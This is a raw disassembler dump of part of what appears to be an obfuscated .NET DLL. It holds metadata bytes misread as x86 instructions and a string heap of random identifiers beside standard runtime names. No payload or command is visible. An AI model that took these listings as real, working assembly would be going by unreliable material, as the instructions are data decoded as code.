100025f1:	00 96 05 ec 07 06    	add    %dl,0x607ec05(%esi)
100025f7:	00 df                	add    %bl,%bh
100025f9:	07                   	pop    %es
100025fa:	77 06                	ja     0x10002602
100025fc:	06                   	push   %es
100025fd:	00 cd                	add    %cl,%ch
100025ff:	05 77 06 06 00       	add    $0x60677,%eax
10002604:	5a                   	pop    %edx
10002605:	03 85 05 06 00 6d    	add    0x6d000605(%ebp),%eax
1000260b:	08 0c 02             	or     %cl,(%edx,%eax,1)
1000260e:	06                   	push   %es
1000260f:	00 c3                	add    %al,%bl
10002611:	06                   	push   %es
10002612:	0c 02                	or     $0x2,%al
10002614:	06                   	push   %es
10002615:	00 a7 00 77 06 0e    	add    %ah,0xe067700(%edi)
1000261b:	00 7b 03             	add    %bh,0x3(%ebx)
1000261e:	10 07                	adc    %al,(%edi)
10002620:	06                   	push   %es
10002621:	00 7b 00             	add    %bh,0x0(%ebx)
10002624:	12 03                	adc    (%ebx),%al
10002626:	06                   	push   %es
10002627:	00 7e 06             	add    %bh,0x6(%esi)
1000262a:	77 06                	ja     0x10002632
1000262c:	06                   	push   %es
1000262d:	00 fc                	add    %bh,%ah
1000262f:	05 0c 02 00 00       	add    $0x20c,%eax
10002634:	00 00                	add    %al,(%eax)
10002636:	f2 00 00             	repnz add %al,(%eax)
10002639:	00 00                	add    %al,(%eax)
1000263b:	00 01                	add    %al,(%ecx)
1000263d:	00 01                	add    %al,(%ecx)
1000263f:	00 81 01 10 00 43    	add    %al,0x43001001(%ecx)
10002645:	08 43 08             	or     %al,0x8(%ebx)
10002648:	41                   	inc    %ecx
10002649:	00 01                	add    %al,(%ecx)
1000264b:	00 01                	add    %al,(%ecx)
1000264d:	00 0b                	add    %cl,(%ebx)
1000264f:	01 10                	add    %edx,(%eax)
10002651:	00 ec                	add    %ch,%ah
10002653:	01 00                	add    %eax,(%eax)
10002655:	00 51 00             	add    %dl,0x0(%ecx)
10002658:	01 00                	add    %eax,(%eax)
1000265a:	09 00                	or     %eax,(%eax)
1000265c:	0b 01                	or     (%ecx),%eax
1000265e:	10 00                	adc    %al,(%eax)
10002660:	00 02                	add    %al,(%edx)
10002662:	00 00                	add    %al,(%eax)
10002664:	51                   	push   %ecx
10002665:	00 05 00 09 00 03    	add    %al,0x3000900
1000266b:	01 10                	add    %edx,(%eax)
1000266d:	00 17                	add    %dl,(%edi)
1000266f:	00 00                	add    %al,(%eax)
10002671:	00 41 00             	add    %al,0x0(%ecx)
10002674:	17                   	pop    %ss
10002675:	00 09                	add    %cl,(%ecx)
10002677:	00 06                	add    %al,(%esi)
10002679:	00 21                	add    %ah,(%ecx)
1000267b:	01 33                	add    %esi,(%ebx)
1000267d:	00 06                	add    %al,(%esi)
1000267f:	00 4a 05             	add    %cl,0x5(%edx)
10002682:	33 00                	xor    (%eax),%eax
10002684:	06                   	push   %es
10002685:	00 33                	add    %dh,(%ebx)
10002687:	06                   	push   %es
10002688:	cf                   	iret
10002689:	00 06                	add    %al,(%esi)
1000268b:	00 01                	add    %al,(%ecx)
1000268d:	06                   	push   %es
1000268e:	cf                   	iret
1000268f:	00 06                	add    %al,(%esi)
10002691:	00 df                	add    %bl,%bh
10002693:	02 cf                	add    %bh,%cl
10002695:	00 06                	add    %al,(%esi)
10002697:	00 2c 02             	add    %ch,(%edx,%eax,1)
1000269a:	d2 00                	rolb   %cl,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 3d 02 d2 00 06    	add    %bh,0x600d202
100026a3:	00 73 01             	add    %dh,0x1(%ebx)
100026a6:	d2 00                	rolb   %cl,(%eax)
100026a8:	06                   	push   %es
100026a9:	00 b3 02 d5 00 06    	add    %dh,0x600d502(%ebx)
100026af:	00 b7 02 d5 00 06    	add    %dh,0x600d502(%edi)
100026b5:	00 69 02             	add    %ch,0x2(%ecx)
100026b8:	d5 00                	aad    $0x0
100026ba:	06                   	push   %es
100026bb:	00 ae 00 d5 00 06    	add    %ch,0x600d500(%esi)
100026c1:	00 90 00 d5 00 06    	add    %dl,0x600d500(%eax)
100026c7:	00 f8                	add    %bh,%al
100026c9:	07                   	pop    %es
100026ca:	d5 00                	aad    $0x0
100026cc:	06                   	push   %es
100026cd:	00 d8                	add    %bl,%al
100026cf:	00 d5                	add    %dl,%ch
100026d1:	00 06                	add    %al,(%esi)
100026d3:	00 00                	add    %al,(%eax)
100026d5:	03 d5                	add    %ebp,%edx
100026d7:	00 06                	add    %al,(%esi)
100026d9:	00 be 01 d8 00 06    	add    %bh,0x600d801(%esi)
100026df:	00 97 03 d8 00 06    	add    %dl,0x600d803(%edi)
100026e5:	00 85 06 33 00 06    	add    %al,0x6003306(%ebp)
100026eb:	00 a3 02 33 00 06    	add    %ah,0x6003302(%ebx)
100026f1:	00 e5                	add    %ah,%ch
100026f3:	06                   	push   %es
100026f4:	33 00                	xor    (%eax),%eax
100026f6:	06                   	push   %es
100026f7:	00 36                	add    %dh,(%esi)
100026f9:	01 33                	add    %esi,(%ebx)
100026fb:	00 06                	add    %al,(%esi)
100026fd:	00 64 01 db          	add    %ah,-0x25(%ecx,%eax,1)
10002701:	00 00                	add    %al,(%eax)
10002703:	00 00                	add    %al,(%eax)
10002705:	00 80 00 91 20 23    	add    %al,0x23209100(%eax)
1000270b:	08 e2                	or     %ah,%dl
1000270d:	00 01                	add    %al,(%ecx)
1000270f:	00 50 20             	add    %dl,0x20(%eax)
10002712:	00 00                	add    %al,(%eax)
10002714:	00 00                	add    %al,(%eax)
10002716:	96                   	xchg   %eax,%esi
10002717:	00 eb                	add    %ch,%bl
10002719:	02 eb                	add    %bl,%ch
1000271b:	00 06                	add    %al,(%esi)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 80 00 91 20 3c    	add    %al,0x3c209100(%eax)
10002727:	03 f2                	add    %edx,%esi
10002729:	00 08                	add    %cl,(%eax)
1000272b:	00 00                	add    %al,(%eax)
1000272d:	00 00                	add    %al,(%eax)
1000272f:	00 80 00 91 20 4e    	add    %al,0x4e209100(%eax)
10002735:	03 f9                	add    %ecx,%edi
10002737:	00 0a                	add    %cl,(%edx)
10002739:	00 00                	add    %al,(%eax)
1000273b:	00 00                	add    %al,(%eax)
1000273d:	00 80 00 91 20 5a    	add    %al,0x5a209100(%eax)
10002743:	08 05 01 11 00 00    	or     %al,0x1101
10002749:	00 00                	add    %al,(%eax)
1000274b:	00 80 00 91 20 ca    	add    %al,-0x35df6f00(%eax)
10002751:	07                   	pop    %es
10002752:	10 01                	adc    %al,(%ecx)
10002754:	16                   	push   %ss
10002755:	00 00                	add    %al,(%eax)
10002757:	00 00                	add    %al,(%eax)
10002759:	00 80 00 91 20 86    	add    %al,-0x79df6f00(%eax)
1000275f:	03 22                	add    (%edx),%esp
10002761:	01 20                	add    %esp,(%eax)
10002763:	00 0c 22             	add    %cl,(%edx,%eiz,1)
10002766:	00 00                	add    %al,(%eax)
10002768:	00 00                	add    %al,(%eax)
1000276a:	93                   	xchg   %eax,%ebx
1000276b:	00 2c 00             	add    %ch,(%eax,%eax,1)
1000276e:	27                   	daa
1000276f:	01 21                	add    %esp,(%ecx)
10002771:	00 7a 24             	add    %bh,0x24(%edx)
10002774:	00 00                	add    %al,(%eax)
10002776:	00 00                	add    %al,(%eax)
10002778:	86 18                	xchg   %bl,(%eax)
1000277a:	36 07                	ss pop %es
1000277c:	06                   	push   %es
1000277d:	00 21                	add    %ah,(%ecx)
1000277f:	00 82 24 00 00 00    	add    %al,0x24(%edx)
10002785:	00 83 00 60 00 2b    	add    %al,0x2b006000(%ebx)
1000278b:	01 21                	add    %esp,(%ecx)
1000278d:	00 00                	add    %al,(%eax)
1000278f:	00 01                	add    %al,(%ecx)
10002791:	00 21                	add    %ah,(%ecx)
10002793:	01 00                	add    %eax,(%eax)
10002795:	00 02                	add    %al,(%edx)
10002797:	00 bb 02 00 00 03    	add    %bh,0x3000002(%ebx)
1000279d:	00 ed                	add    %ch,%ch
1000279f:	05 00 00 04 00       	add    $0x40000,%eax
100027a4:	4f                   	dec    %edi
100027a5:	02 00                	add    (%eax),%al
100027a7:	00 05 00 01 00 00    	add    %al,0x100
100027ad:	00 01                	add    %al,(%ecx)
100027af:	00 12                	add    %dl,(%edx)
100027b1:	01 00                	add    %eax,(%eax)
100027b3:	00 02                	add    %al,(%edx)
100027b5:	00 c5                	add    %al,%ch
100027b7:	00 00                	add    %al,(%eax)
100027b9:	00 01                	add    %al,(%ecx)
100027bb:	00 4a 05             	add    %cl,0x5(%edx)
100027be:	02 00                	add    (%eax),%al
100027c0:	02 00                	add    (%eax),%al
100027c2:	59                   	pop    %ecx
100027c3:	05 00 00 01 00       	add    $0x10000,%eax
100027c8:	21 01                	and    %eax,(%ecx)
100027ca:	00 00                	add    %al,(%eax)
100027cc:	02 00                	add    (%eax),%al
100027ce:	9f                   	lahf
100027cf:	01 00                	add    %eax,(%eax)
100027d1:	00 03                	add    %al,(%ebx)
100027d3:	00 af 01 00 00 04    	add    %ch,0x4000001(%edi)
100027d9:	00 83 08 00 00 05    	add    %al,0x5000008(%ebx)
100027df:	00 88 01 00 00 06    	add    %cl,0x6000001(%eax)
100027e5:	00 d4                	add    %dl,%ah
100027e7:	01 02                	add    %eax,(%edx)
100027e9:	00 07                	add    %al,(%edi)
100027eb:	00 1a                	add    %bl,(%edx)
100027ed:	06                   	push   %es
100027ee:	00 00                	add    %al,(%eax)
100027f0:	01 00                	add    %eax,(%eax)
100027f2:	21 01                	and    %eax,(%ecx)
100027f4:	00 00                	add    %al,(%eax)
100027f6:	02 00                	add    (%eax),%al
100027f8:	6d                   	insl   (%dx),%es:(%edi)
100027f9:	05 00 00 03 00       	add    $0x30000,%eax
100027fe:	43                   	inc    %ebx
100027ff:	07                   	pop    %es
10002800:	00 00                	add    %al,(%eax)
10002802:	04 00                	add    $0x0,%al
10002804:	4e                   	dec    %esi
10002805:	01 02                	add    %eax,(%edx)
10002807:	00 05 00 1c 07 00    	add    %al,0x71c00
1000280d:	00 01                	add    %al,(%ecx)
1000280f:	00 94 02 00 00 02 00 	add    %dl,0x20000(%edx,%eax,1)
10002816:	09 08                	or     %ecx,(%eax)
10002818:	00 00                	add    %al,(%eax)
1000281a:	03 00                	add    (%eax),%eax
1000281c:	ce                   	into
1000281d:	02 00                	add    (%eax),%al
1000281f:	00 04 00             	add    %al,(%eax,%eax,1)
10002822:	9f                   	lahf
10002823:	01 00                	add    %eax,(%eax)
10002825:	00 05 00 7a 02 00    	add    %al,0x27a00
1000282b:	00 06                	add    %al,(%esi)
1000282d:	00 d4                	add    %dl,%ah
1000282f:	01 00                	add    %eax,(%eax)
10002831:	00 07                	add    %al,(%edi)
10002833:	00 32                	add    %dh,(%edx)
10002835:	08 00                	or     %al,(%eax)
10002837:	00 08                	add    %cl,(%eax)
10002839:	00 16                	add    %dl,(%esi)
1000283b:	02 00                	add    (%eax),%al
1000283d:	00 09                	add    %cl,(%ecx)
1000283f:	00 fb                	add    %bh,%bl
10002841:	06                   	push   %es
10002842:	02 00                	add    (%eax),%al
10002844:	0a 00                	or     (%eax),%al
10002846:	fb                   	sti
10002847:	00 00                	add    %al,(%eax)
10002849:	00 01                	add    %al,(%ecx)
1000284b:	00 d4                	add    %dl,%ah
1000284d:	05 00 00 01 00       	add    $0x10000,%eax
10002852:	92                   	xchg   %eax,%edx
10002853:	03 09                	add    (%ecx),%ecx
10002855:	00 36                	add    %dh,(%esi)
10002857:	07                   	pop    %es
10002858:	01 00                	add    %eax,(%eax)
1000285a:	11 00                	adc    %eax,(%eax)
1000285c:	36 07                	ss pop %es
1000285e:	06                   	push   %es
1000285f:	00 19                	add    %bl,(%ecx)
10002861:	00 36                	add    %dh,(%esi)
10002863:	07                   	pop    %es
10002864:	0a 00                	or     (%eax),%al
10002866:	29 00                	sub    %eax,(%eax)
10002868:	36 07                	ss pop %es
1000286a:	10 00                	adc    %al,(%eax)
1000286c:	31 00                	xor    %eax,(%eax)
1000286e:	36 07                	ss pop %es
10002870:	10 00                	adc    %al,(%eax)
10002872:	39 00                	cmp    %eax,(%eax)
10002874:	36 07                	ss pop %es
10002876:	10 00                	adc    %al,(%eax)
10002878:	41                   	inc    %ecx
10002879:	00 36                	add    %dh,(%esi)
1000287b:	07                   	pop    %es
1000287c:	10 00                	adc    %al,(%eax)
1000287e:	49                   	dec    %ecx
1000287f:	00 36                	add    %dh,(%esi)
10002881:	07                   	pop    %es
10002882:	10 00                	adc    %al,(%eax)
10002884:	51                   	push   %ecx
10002885:	00 36                	add    %dh,(%esi)
10002887:	07                   	pop    %es
10002888:	10 00                	adc    %al,(%eax)
1000288a:	59                   	pop    %ecx
1000288b:	00 36                	add    %dh,(%esi)
1000288d:	07                   	pop    %es
1000288e:	10 00                	adc    %al,(%eax)
10002890:	61                   	popa
10002891:	00 36                	add    %dh,(%esi)
10002893:	07                   	pop    %es
10002894:	15 00 69 00 36       	adc    $0x36006900,%eax
10002899:	07                   	pop    %es
1000289a:	10 00                	adc    %al,(%eax)
1000289c:	71 00                	jno    0x1000289e
1000289e:	36 07                	ss pop %es
100028a0:	10 00                	adc    %al,(%eax)
100028a2:	79 00                	jns    0x100028a4
100028a4:	36 07                	ss pop %es
100028a6:	10 00                	adc    %al,(%eax)
100028a8:	99                   	cltd
100028a9:	00 36                	add    %dh,(%esi)
100028ab:	07                   	pop    %es
100028ac:	06                   	push   %es
100028ad:	00 b1 00 43 05 27    	add    %dh,0x27054300(%ecx)
100028b3:	00 b9 00 da 06 33    	add    %bh,0x3306da00(%ecx)
100028b9:	00 b9 00 77 08 36    	add    %bh,0x36087700(%ecx)
100028bf:	00 c1                	add    %al,%cl
100028c1:	00 e9                	add    %ch,%cl
100028c3:	00 3c 00             	add    %bh,(%eax,%eax,1)
100028c6:	c9                   	leave
100028c7:	00 b9 05 41 00 c1    	add    %bh,-0x3effbefb(%ecx)
100028cd:	00 ca                	add    %cl,%dl
100028cf:	05 47 00 d1 00       	add    $0xd10047,%eax
100028d4:	73 03                	jae    0x100028d9
100028d6:	4d                   	dec    %ebp
100028d7:	00 91 00 36 07 10    	add    %dl,0x10073600(%ecx)
100028dd:	00 d9                	add    %bl,%cl
100028df:	00 df                	add    %bl,%bh
100028e1:	06                   	push   %es
100028e2:	53                   	push   %ebx
100028e3:	00 89 00 2d 03 58    	add    %cl,0x58032d00(%ecx)
100028e9:	00 89 00 65 03 5e    	add    %cl,0x5e036500(%ecx)
100028ef:	00 89 00 72 06 06    	add    %cl,0x6067200(%ecx)
100028f5:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028f8:	36 07                	ss pop %es
100028fa:	06                   	push   %es
100028fb:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028fe:	61                   	popa
100028ff:	03 6f 00             	add    0x0(%edi),%ebp
10002902:	e1 00                	loope  0x10002904
10002904:	b8 07 75 00 14       	mov    $0x14007507,%eax
10002909:	00 36                	add    %dh,(%esi)
1000290b:	07                   	pop    %es
1000290c:	85 00                	test   %eax,(%eax)
1000290e:	f9                   	stc
1000290f:	00 b1 03 8b 00 f9    	add    %dh,-0x6ff74fd(%ecx)
10002915:	00 52 08             	add    %dl,0x8(%edx)
10002918:	a8 00                	test   $0x0,%al
1000291a:	09 01                	or     %eax,(%ecx)
1000291c:	36 07                	ss pop %es
1000291e:	06                   	push   %es
1000291f:	00 09                	add    %cl,(%ecx)
10002921:	01 e7                	add    %esp,%edi
10002923:	07                   	pop    %es
10002924:	b6 00                	mov    $0x0,%dh
10002926:	81 00 36 07 06 00    	addl   $0x60736,(%eax)
1000292c:	11 01                	adc    %eax,(%ecx)
1000292e:	95                   	xchg   %eax,%ebp
1000292f:	06                   	push   %es
10002930:	bb 00 0c 00 c1       	mov    $0xc1000c00,%ebx
10002935:	07                   	pop    %es
10002936:	c0 00 2e             	rolb   $0x2e,(%eax)
10002939:	00 0b                	add    %cl,(%ebx)
1000293b:	00 30                	add    %dh,(%eax)
1000293d:	01 2e                	add    %ebp,(%esi)
1000293f:	00 13                	add    %dl,(%ebx)
10002941:	00 39                	add    %bh,(%ecx)
10002943:	01 2e                	add    %ebp,(%esi)
10002945:	00 1b                	add    %bl,(%ebx)
10002947:	00 58 01             	add    %bl,0x1(%eax)
1000294a:	2e 00 23             	add    %ah,%cs:(%ebx)
1000294d:	00 61 01             	add    %ah,0x1(%ecx)
10002950:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002953:	00 75 01             	add    %dh,0x1(%ebp)
10002956:	2e 00 33             	add    %dh,%cs:(%ebx)
10002959:	00 75 01             	add    %dh,0x1(%ebp)
1000295c:	2e 00 3b             	add    %bh,%cs:(%ebx)
1000295f:	00 75 01             	add    %dh,0x1(%ebp)
10002962:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
10002966:	61                   	popa
10002967:	01 2e                	add    %ebp,(%esi)
10002969:	00 4b 00             	add    %cl,0x0(%ebx)
1000296c:	7b 01                	jnp    0x1000296f
1000296e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
10002972:	75 01                	jne    0x10002975
10002974:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
10002978:	75 01                	jne    0x1000297b
1000297a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
1000297e:	93                   	xchg   %eax,%ebx
1000297f:	01 2e                	add    %ebp,(%esi)
10002981:	00 6b 00             	add    %ch,0x0(%ebx)
10002984:	bd 01 2e 00 73       	mov    $0x73002e01,%ebp
10002989:	00 ca                	add    %cl,%dl
1000298b:	01 a3 00 7b 00 14    	add    %esp,0x14007b00(%ebx)
10002991:	02 00                	add    (%eax),%al
10002993:	01 7b 00             	add    %edi,0x0(%ebx)
10002996:	14 02                	adc    $0x2,%al
10002998:	1a 00                	sbb    (%eax),%al
1000299a:	62 00                	bound  %eax,(%eax)
1000299c:	52                   	push   %edx
1000299d:	06                   	push   %es
1000299e:	69 00 7e 00 40 01    	imul   $0x140007e,(%eax),%eax
100029a4:	03 00                	add    (%eax),%eax
100029a6:	23 08                	and    (%eax),%ecx
100029a8:	01 00                	add    %eax,(%eax)
100029aa:	40                   	inc    %eax
100029ab:	01 07                	add    %eax,(%edi)
100029ad:	00 3c 03             	add    %bh,(%ebx,%eax,1)
100029b0:	01 00                	add    %eax,(%eax)
100029b2:	40                   	inc    %eax
100029b3:	01 09                	add    %ecx,(%ecx)
100029b5:	00 4e 03             	add    %cl,0x3(%esi)
100029b8:	01 00                	add    %eax,(%eax)
100029ba:	40                   	inc    %eax
100029bb:	01 0b                	add    %ecx,(%ebx)
100029bd:	00 5a 08             	add    %bl,0x8(%edx)
100029c0:	01 00                	add    %eax,(%eax)
100029c2:	40                   	inc    %eax
100029c3:	01 0d 00 ca 07 01    	add    %ecx,0x107ca00
100029c9:	00 00                	add    %al,(%eax)
100029cb:	01 0f                	add    %ecx,(%edi)
100029cd:	00 86 03 01 00 04    	add    %al,0x4000103(%esi)
100029d3:	80 00 00             	addb   $0x0,(%eax)
100029d6:	01 00                	add    %eax,(%eax)
	...
100029e4:	43                   	inc    %ebx
100029e5:	08 00                	or     %al,(%eax)
100029e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
100029f2:	00 00                	add    %al,(%eax)
100029f4:	c6 00 e2             	movb   $0xe2,(%eax)
100029f7:	02 00                	add    (%eax),%al
100029f9:	00 00                	add    %al,(%eax)
100029fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002a06:	00 00                	add    %al,(%eax)
10002a08:	c6 00 77             	movb   $0x77,(%eax)
10002a0b:	06                   	push   %es
10002a0c:	00 00                	add    %al,(%eax)
10002a0e:	00 00                	add    %al,(%eax)
10002a10:	04 00                	add    $0x0,%al
	...
10002a1a:	00 00                	add    %al,(%eax)
10002a1c:	c6 00 b7             	movb   $0xb7,(%eax)
10002a1f:	03 00                	add    (%eax),%eax
10002a21:	00 00                	add    %al,(%eax)
10002a23:	00 03                	add    %al,(%ebx)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 04 00             	add    %al,(%eax,%eax,1)
10002a2a:	02 00                	add    (%eax),%al
10002a2c:	05 00 02 00 21       	add    $0x21000200,%eax
10002a31:	00 2e                	add    %ch,(%esi)
10002a33:	00 41 00             	add    %al,0x0(%ecx)
10002a36:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a37:	00 43 00             	add    %al,0x0(%ebx)
10002a3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	00 00                	add    %al,(%eax)
10002a3f:	00 00                	add    %al,(%eax)
10002a41:	4d                   	dec    %ebp
10002a42:	4f                   	dec    %edi
10002a43:	59                   	pop    %ecx
10002a44:	56                   	push   %esi
10002a45:	43                   	inc    %ebx
10002a46:	57                   	push   %edi
10002a47:	33 4e 39             	xor    0x39(%esi),%ecx
10002a4a:	48                   	dec    %eax
10002a4b:	54                   	push   %esp
10002a4c:	77 31                	ja     0x10002a7f
10002a4e:	48                   	dec    %eax
10002a4f:	4b                   	dec    %ebx
10002a50:	75 74                	jne    0x10002ac6
10002a52:	51                   	push   %ecx
10002a53:	34 4e                	xor    $0x4e,%al
10002a55:	30 00                	xor    %al,(%eax)
10002a57:	3c 3e                	cmp    $0x3e,%al
10002a59:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002a5c:	44                   	inc    %esp
10002a5d:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002a64:	6c                   	insb   (%dx),%es:(%edi)
10002a65:	61                   	popa
10002a66:	73 73                	jae    0x10002adb
10002a68:	32 5f 30             	xor    0x30(%edi),%bl
10002a6b:	00 3c 4a             	add    %bh,(%edx,%ecx,2)
10002a6e:	76 66                	jbe    0x10002ad6
10002a70:	65 6a 45             	gs push $0x45
10002a73:	64 47                	fs inc %edi
10002a75:	6a 6f                	push   $0x6f
10002a77:	39 43 55             	cmp    %eax,0x55(%ebx)
10002a7a:	32 39                	xor    (%ecx),%bh
10002a7c:	79 38                	jns    0x10002ab6
10002a7e:	34 70                	xor    $0x70,%al
10002a80:	62 3e                	bound  %edi,(%esi)
10002a82:	67 5f                	addr16 pop %edi
10002a84:	5f                   	pop    %edi
10002a85:	59                   	pop    %ecx
10002a86:	49                   	dec    %ecx
10002a87:	7a 5a                	jp     0x10002ae3
10002a89:	45                   	inc    %ebp
10002a8a:	76 63                	jbe    0x10002aef
10002a8c:	41                   	inc    %ecx
10002a8d:	43                   	inc    %ebx
10002a8e:	55                   	push   %ebp
10002a8f:	57                   	push   %edi
10002a90:	42                   	inc    %edx
10002a91:	66 76 56             	data16 jbe 0x10002aea
10002a94:	36 68 76 33 44 64    	ss push $0x64443376
10002a9a:	68 7c 32 5f 30       	push   $0x305f327c
10002a9f:	00 3c 4a             	add    %bh,(%edx,%ecx,2)
10002aa2:	76 66                	jbe    0x10002b0a
10002aa4:	65 6a 45             	gs push $0x45
10002aa7:	64 47                	fs inc %edi
10002aa9:	6a 6f                	push   $0x6f
10002aab:	39 43 55             	cmp    %eax,0x55(%ebx)
10002aae:	32 39                	xor    (%ecx),%bh
10002ab0:	79 38                	jns    0x10002aea
10002ab2:	34 70                	xor    $0x70,%al
10002ab4:	62 3e                	bound  %edi,(%esi)
10002ab6:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002ab9:	31 00                	xor    %eax,(%eax)
10002abb:	49                   	dec    %ecx
10002abc:	45                   	inc    %ebp
10002abd:	6e                   	outsb  %ds:(%esi),(%dx)
10002abe:	75 6d                	jne    0x10002b2d
10002ac0:	65 72 61             	gs jb  0x10002b24
10002ac3:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002ac7:	31 00                	xor    %eax,(%eax)
10002ac9:	4c                   	dec    %esp
10002aca:	69 73 74 60 31 00 4d 	imul   $0x4d003160,0x74(%ebx),%esi
10002ad1:	4d                   	dec    %ebp
10002ad2:	53                   	push   %ebx
10002ad3:	56                   	push   %esi
10002ad4:	57                   	push   %edi
10002ad5:	4d                   	dec    %ebp
10002ad6:	44                   	inc    %esp
10002ad7:	64 59                	fs pop %ecx
10002ad9:	4e                   	dec    %esi
10002ada:	79 4f                	jns    0x10002b2b
10002adc:	65 41                	gs inc %ecx
10002ade:	6f                   	outsl  %ds:(%esi),(%dx)
10002adf:	6a 48                	push   $0x48
10002ae1:	69 65 4a 39 32 00 46 	imul   $0x46003239,0x4a(%ebp),%esp
10002ae8:	75 6e                	jne    0x10002b58
10002aea:	63 60 32             	arpl   %esp,0x32(%eax)
10002aed:	00 58 71             	add    %bl,0x71(%eax)
10002af0:	78 66                	js     0x10002b58
10002af2:	4f                   	dec    %edi
10002af3:	46                   	inc    %esi
10002af4:	49                   	dec    %ecx
10002af5:	50                   	push   %eax
10002af6:	34 49                	xor    $0x49,%al
10002af8:	51                   	push   %ecx
10002af9:	6c                   	insb   (%dx),%es:(%edi)
10002afa:	48                   	dec    %eax
10002afb:	74 43                	je     0x10002b40
10002afd:	77 37                	ja     0x10002b36
10002aff:	66 30 77 72          	data16 xor %dh,0x72(%edi)
10002b03:	34 00                	xor    $0x0,%al
10002b05:	44                   	inc    %esp
10002b06:	50                   	push   %eax
10002b07:	53                   	push   %ebx
10002b08:	67 64 68 61 52 55 78 	addr16 fs push $0x78555261
10002b0f:	41                   	inc    %ecx
10002b10:	4b                   	dec    %ebx
10002b11:	4f                   	dec    %edi
10002b12:	49                   	dec    %ecx
10002b13:	67 67 64 36 00 4f 78 	addr16 fs add %cl,%ss:0x78(%bx)
10002b1a:	41                   	inc    %ecx
10002b1b:	4e                   	dec    %esi
10002b1c:	4c                   	dec    %esp
10002b1d:	4c                   	dec    %esp
10002b1e:	56                   	push   %esi
10002b1f:	73 68                	jae    0x10002b89
10002b21:	52                   	push   %edx
10002b22:	54                   	push   %esp
10002b23:	67 33 69 69          	xor    0x69(%bx,%di),%ebp
10002b27:	37                   	aaa
10002b28:	00 67 65             	add    %ah,0x65(%edi)
10002b2b:	74 5f                	je     0x10002b8c
10002b2d:	55                   	push   %ebp
10002b2e:	54                   	push   %esp
10002b2f:	46                   	inc    %esi
10002b30:	38 00                	cmp    %al,(%eax)
10002b32:	3c 4d                	cmp    $0x4d,%al
10002b34:	6f                   	outsl  %ds:(%esi),(%dx)
10002b35:	64 75 6c             	fs jne 0x10002ba4
10002b38:	65 3e 00 54 6e 6f    	gs add %dl,%ds:0x6f(%esi,%ebp,2)
10002b3e:	68 65 5a 44 45       	push   $0x45445a65
10002b43:	6f                   	outsl  %ds:(%esi),(%dx)
10002b44:	6b 59 66 48          	imul   $0x48,0x66(%ecx),%ebx
10002b48:	6e                   	outsb  %ds:(%esi),(%dx)
10002b49:	63 4f 59             	arpl   %ecx,0x59(%edi)
10002b4c:	46                   	inc    %esi
10002b4d:	47                   	inc    %edi
10002b4e:	33 71 42             	xor    0x42(%ecx),%esi
10002b51:	00 4a 74             	add    %cl,0x74(%edx)
10002b54:	48                   	dec    %eax
10002b55:	45                   	inc    %ebp
10002b56:	53                   	push   %ebx
10002b57:	6b 4d 77 49          	imul   $0x49,0x77(%ebp),%ecx
10002b5b:	48                   	dec    %eax
10002b5c:	6e                   	outsb  %ds:(%esi),(%dx)
10002b5d:	65 39 44 00 55       	cmp    %eax,%gs:0x55(%eax,%eax,1)
10002b62:	68 76 58 44 70       	push   $0x70445876
10002b67:	34 5a                	xor    $0x5a,%al
10002b69:	52                   	push   %edx
10002b6a:	74 6a                	je     0x10002bd6
10002b6c:	38 32                	cmp    %dh,(%edx)
10002b6e:	4f                   	dec    %edi
10002b6f:	72 78                	jb     0x10002be9
10002b71:	70 4b                	jo     0x10002bbe
10002b73:	31 45 00             	xor    %eax,0x0(%ebp)
10002b76:	5a                   	pop    %edx
10002b77:	44                   	inc    %esp
10002b78:	63 7a 51             	arpl   %edi,0x51(%edx)
10002b7b:	56                   	push   %esi
10002b7c:	4a                   	dec    %edx
10002b7d:	38 52 6f             	cmp    %dl,0x6f(%edx)
10002b80:	78 47                	js     0x10002bc9
10002b82:	4b                   	dec    %ebx
10002b83:	71 74                	jno    0x10002bf9
10002b85:	65 71 52             	gs jno 0x10002bda
10002b88:	70 50                	jo     0x10002bda
10002b8a:	38 51 45             	cmp    %dl,0x45(%ecx)
10002b8d:	00 56 68             	add    %dl,0x68(%esi)
10002b90:	63 6a 63             	arpl   %ebp,0x63(%edx)
10002b93:	55                   	push   %ebp
10002b94:	4f                   	dec    %edi
10002b95:	62 39                	bound  %edi,(%ecx)
10002b97:	4a                   	dec    %edx
10002b98:	58                   	pop    %eax
10002b99:	62 36                	bound  %esi,(%esi)
10002b9b:	34 69                	xor    $0x69,%al
10002b9d:	62 71 74             	bound  %esi,0x74(%ecx)
10002ba0:	33 5a 46             	xor    0x46(%edx),%ebx
10002ba3:	00 47 72             	add    %al,0x72(%edi)
10002ba6:	5a                   	pop    %edx
10002ba7:	41                   	inc    %ecx
10002ba8:	70 50                	jo     0x10002bfa
10002baa:	4e                   	dec    %esi
10002bab:	48                   	dec    %eax
10002bac:	53                   	push   %ebx
10002bad:	75 56                	jne    0x10002c05
10002baf:	33 32                	xor    (%edx),%esi
10002bb1:	48                   	dec    %eax
10002bb2:	00 43 6b             	add    %al,0x6b(%ebx)
10002bb5:	4f                   	dec    %edi
10002bb6:	79 74                	jns    0x10002c2c
10002bb8:	43                   	inc    %ebx
10002bb9:	4e                   	dec    %esi
10002bba:	71 32                	jno    0x10002bee
10002bbc:	6e                   	outsb  %ds:(%esi),(%dx)
10002bbd:	30 52 38             	xor    %dl,0x38(%edx)
10002bc0:	45                   	inc    %ebp
10002bc1:	38 64 68 71          	cmp    %ah,0x71(%eax,%ebp,2)
